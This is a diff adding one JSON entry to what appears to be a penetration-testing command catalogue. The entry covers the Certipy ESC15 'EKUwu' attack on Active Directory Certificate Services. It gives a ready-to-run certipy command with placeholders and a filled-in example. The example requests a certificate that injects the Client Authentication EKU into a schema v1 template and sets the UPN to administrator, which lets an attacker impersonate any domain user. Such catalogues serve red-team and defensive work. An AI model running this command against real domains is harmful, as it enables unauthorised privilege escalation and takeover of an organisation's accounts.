@@ -1,0 +1,16 @@
+{
+  "id": "certipy-esc15",
+  "name": "Certipy ESC15 (Schema V1 EKUwu)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<v1-template>' -application-policies 'Client Authentication' -upn '<target>@<domain>'",
+  "description": "ESC15 / EKUwu: schema v1 templates honor Application Policies from the CSR, letting an enrollee inject Client Authentication EKU into a template that does not normally allow it. Combine with a SAN/UPN override to impersonate any user.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc15", "ekuwu", "application-policies"],
+  "references": [
+    { "title": "EKUwu (CVE-2024-49019)", "url": "https://www.trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc" }
+  ],
+  "examples": [
+    "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template WebServer -application-policies 'Client Authentication' -upn administrator@corp.local"
+  ]
+}
